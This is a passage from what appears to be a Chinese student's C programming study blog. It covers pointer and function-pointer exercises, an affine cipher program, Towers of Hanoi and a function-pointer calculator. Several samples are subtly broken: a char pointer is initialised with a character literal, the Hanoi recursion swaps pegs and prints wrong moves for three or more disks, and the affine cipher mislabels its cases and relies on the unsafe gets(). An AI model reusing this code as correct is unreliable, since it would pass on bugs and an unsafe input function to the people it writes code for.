class="number">10</span> &#125;;</span><br><span class="line">    <span class="type">int</span>* p = arr;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//p是一级指针</span></span><br><span class="line">    print(p, sz);</span><br><span class="line">    <span class="type">char</span>* ch = <span class="string">&#x27;w&#x27;</span>; <span class="comment">// 数组名是首地址</span></span><br><span class="line">    <span class="type">char</span>* p1 = &amp;ch; <span class="comment">//对于其它类型的变量需要取地址</span></span><br><span class="line">    test(&amp;ch);      <span class="comment">//取地址完再存放到同类型的指针变量也行</span></span><br><span class="line">    test(p1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="二级指传参"><a href="#二级指传参" class="headerlink" title="二级指传参"></a>二级指传参</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span>** p2)</span></span><br><span class="line">&#123;</span><br><span class="line">    **p2 = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>* pa = &amp;a;<span class="comment">//pa一级指针</span></span><br><span class="line">    <span class="type">int</span>** ppa = &amp;pa;<span class="comment">//ppa是二级指针</span></span><br><span class="line">    <span class="comment">//把二级指针进行传参？</span></span><br><span class="line">    test(ppa);</span><br><span class="line">    test(&amp;pa);<span class="comment">//传一级指针变量的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>* pa = &amp;a;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    <span class="type">char</span>* pc = &amp;ch;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> (*parr)[<span class="number">10</span>] = &amp;arr;<span class="comment">//取出数组的地址</span></span><br><span class="line">    <span class="comment">//parr 是指向数组的指针 - 存放的是数组的地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数指针-存放函数地址的指针</span></span><br><span class="line">    <span class="comment">//&amp;函数名- 取到的是函数的地址</span></span><br><span class="line">    <span class="comment">//数组名 != &amp;数组名 函数名 == &amp;函数名</span></span><br><span class="line">    <span class="comment">//pf就是一个函数指针变量</span></span><br><span class="line">    <span class="type">int</span> (*pf)(<span class="type">int</span>, <span class="type">int</span>) = &amp;Add;<span class="comment">//</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, &amp;Add);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, Add);//结果一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*pt)(<span class="type">char</span>*) = &amp;test;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*pf)(<span class="type">int</span>, <span class="type">int</span>) = &amp;Add;<span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> ret = (*pf)(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//另外的写法</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int (*pf)(int, int) = Add;//</span></span><br><span class="line"><span class="comment">    //int ret = (*pf)(3, 5);</span></span><br><span class="line"><span class="comment">    int ret = pf(3, 5);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;, ret);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="阅读俩段代码"><a href="#阅读俩段代码" class="headerlink" title="阅读俩段代码"></a>阅读俩段代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码1</span></span><br><span class="line">(*(<span class="type">void</span> (*)())<span class="number">0</span>)();</span><br><span class="line"><span class="comment">//调用0地址的函数，该函数无参，发返回类型是void</span></span><br><span class="line"><span class="comment">//1.void (*)() 函数指针类型</span></span><br><span class="line"><span class="comment">//2. ((void (*)()0 对0进行强制类型转化，被解释为一个函数地址</span></span><br><span class="line"><span class="comment">//3.(*(void (*)())0)() 调用0地址处的函数</span></span><br><span class="line"><span class="comment">//代码2</span></span><br><span class="line"><span class="type">void</span> (*signal(<span class="type">int</span> , <span class="type">void</span>(*)(<span class="type">int</span>)))(<span class="type">int</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//1. signal(int, void(*)(int)) + void(*)(int)</span></span><br><span class="line"><span class="comment">//2.signal和()先结合，说明signal是函数名</span></span><br><span class="line"><span class="comment">//3.signal函数的第一个参数类型是int，第二个参数的类型是函数指针</span></span><br><span class="line"><span class="comment">//该函数指针指向一个参数为int返回类型是void的函数</span></span><br><span class="line"><span class="comment">//4.signal函数的返回类型也是一个函数指针该函数指针指向一个参数为int，返回类型是void的函数</span></span><br><span class="line"><span class="comment">//5.signal是一个函数的声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*<span class="type">pfun_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;<span class="comment">//对void(*)(int)的函数指针型重命名为pfun_t</span></span><br><span class="line"><span class="comment">//typedef unsigned int uint;</span></span><br><span class="line"></span><br><span class="line"><span class="type">pfun_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span>, <span class="type">pfun_t</span>)</span>;</span><br></pre></td></tr></table></figure><h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Affine</span><span class="params">()</span> <span class="comment">/* 仿射密码 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> length, i = <span class="number">0</span>, ka = <span class="number">0</span>, kb = <span class="number">0</span>, tmp;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********仿射密码********\n请输入最初的明文:&quot;</span>);</span><br><span class="line">    gets(c);</span><br><span class="line">    length = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入秘钥（两数字）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (gcd(ka,<span class="number">26</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;秘钥输入错误，请重新输入：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">        getchar(); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//大写字母 </span></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt; <span class="number">96</span> &amp;&amp; c[i] &lt; <span class="number">123</span>)</span><br><span class="line">            c[i] = (ka * (c[i] - <span class="number">97</span>) + kb) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        <span class="comment">//小写字母 </span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c[i] &gt; <span class="number">64</span> &amp;&amp; c[i] &lt; <span class="number">91</span>)</span><br><span class="line">            c[i] = (ka * (c[i] - <span class="number">65</span>) + kb) % <span class="number">26</span> + <span class="number">65</span>;   </span><br><span class="line">     &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n密文为：\n%s\n&quot;</span>, c);</span><br><span class="line">    <span class="comment">//printf(&quot;********请安1~3选择：********\n&quot;);</span></span><br><span class="line">    <span class="comment">//printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="comment">/* 求最大公因数 */</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        k = a % b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = k;</span><br><span class="line">    &#125; <span class="keyword">while</span>(k != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">exAffine</span><span class="params">()</span> <span class="comment">/* 仿射加密 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> length, i = <span class="number">0</span>, ka = <span class="number">0</span>, kb = <span class="number">0</span>, tmp;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********仿射密码*******\n请输入最初的密文：&quot;</span>);</span><br><span class="line">    gets(c);</span><br><span class="line">    length = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入秘钥（两数字）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (gcd(ka,<span class="number">26</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;秘钥输入错误，请重新输入：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">        getchar(); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//大写字母 </span></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt; <span class="number">64</span> &amp;&amp; c[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = Ni(ka, <span class="number">26</span>) * ((c[i] - <span class="number">65</span>) - kb);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//小写字母 </span></span><br><span class="line">         <span class="keyword">if</span> (c[i] &gt; <span class="number">96</span> &amp;&amp; c[i] &lt; <span class="number">123</span>)</span><br><span class="line">         &#123;</span><br><span class="line">            tmp = Ni(ka, <span class="number">26</span>) * ((c[i] - <span class="number">97</span>) - kb);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n明文为：\n %s \n&quot;</span>, c);</span><br><span class="line">    <span class="comment">//printf(&quot;********请安1~3选择：********\n&quot;);</span></span><br><span class="line">    <span class="comment">//printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);</span></span><br><span class="line">    </span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">Ni</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (a * (++i) % b != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> i = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********请按1~3选择：********\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;</span>);</span><br><span class="line">    <span class="comment">//scanf(&quot;%c&quot;, &amp;i);</span></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    i = getch(); </span><br><span class="line">    <span class="keyword">while</span> (i != <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            Affine();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            exAffine();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;********请按1~3选择：********\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;</span>);</span><br><span class="line">        i = getch();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 俩层 </span></span><br><span class="line"><span class="comment">/*  三层 </span></span><br><span class="line"><span class="comment">1: A-&gt;C</span></span><br><span class="line"><span class="comment">2: A-&gt;B A-&gt;C B-&gt;C</span></span><br><span class="line"><span class="comment">3: A-&gt;C A-&gt;B C-&gt;B A-&gt;C B-&gt;A B-&gt;C A-&gt;C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">(<span class="type">char</span> pos1, <span class="type">char</span> pos2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;%c &quot;</span>, pos1, pos2);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">Hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> pos1, <span class="type">char</span> pos2, <span class="type">char</span> pos3)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        move(pos1, pos3);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Hanoi(n - <span class="number">1</span>, pos1, pos2, pos3);</span><br><span class="line">        move(pos1, pos3);</span><br><span class="line">        Hanoi(n - <span class="number">1</span>, pos2, pos1, pos3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">N:代表盘子个数</span></span><br><span class="line"><span class="comment">pos1:起始位置 </span></span><br><span class="line"><span class="comment">pos2:中转位置</span></span><br><span class="line"><span class="comment">pos3:目的位置</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Hanoi(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Hanoi(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Hanoi(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/17KRvbOmujZaqi8.png" alt="image.png"></p><h3 id="3-10"><a href="#3-10" class="headerlink" title="3_10"></a>3_10</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Mul</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (x / y);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.add\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.sub\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3.mul\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4.div\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0.exit\n&quot;</span>);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*pf1)(<span class="type">int</span>, <span class="type">int</span>) = Add;</span><br><span class="line">    <span class="type">int</span> (*pf2)(<span class="type">int</span>, <span class="type">int</span>) = Sub;</span><br><span class="line">    <span class="comment">// pfArr[2] + int(*)(int, int)  </span></span><br><span class="line">    <span class="type">int</span> (*pfArr[<span class="number">2</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123;Add, Sub&#125;;</span><br><span class="line">    <span class="comment">//*pfArr 就是函数指针数组 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//计算器-计算整型变量的加、减、乘、除。 </span></span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        menu();</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择：&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">switch</span> (input)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Add(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Sub(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = Mul(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入俩个操作数&gt;:&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">                ret = div(x, y);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;退出程序&quot;</span>);</span><br><span class="line">                input = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;选择错误，请重新选择&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">    &#125; <span class="keyword">while</span> (input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算器-计算整型变量的加、减、乘、除。</span></span><br><span class="line">    <span class="comment">//a&amp;b a^b a|b a&gt;&gt;b a&lt;&lt;b a&gt;b </span></span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> (*pfArr[<span class="number">5</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123;<span class="literal">NULL</span>, Add, Sub, Mul, div&#125;;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择：&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">if</span> (input &gt;= <span class="number">1</span> &amp;&amp; input &lt;= <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入2个操作数&gt;:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y); </span><br><span class="line">            ret = (pfArr[input])(x, y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;选择错误\n&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; <span class="keyword">while</span> (input);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>描述<br>KiKi写了一个输出“Hello world!”的程序，BoBo老师告诉他printf函数有返回值，你能帮他写个程序输出printf(“Hello world!”)的返回值吗？<br>输入描述：<br>无<br>输出描述：<br>包括两行：<br>第一行为“Hello world!”<br>第二行为printf(“Hello world!”)调用后的返回值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//printf函数源码</span></span><br><span class="line"><span class="comment">//int __cdecl printf(const char * __restrict__ _Format,...);</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,  a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BC15-大小写转换"><a href="#BC15-大小写转换" class="headerlink" title="BC15 大小写转换"></a>BC15 大小写转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span 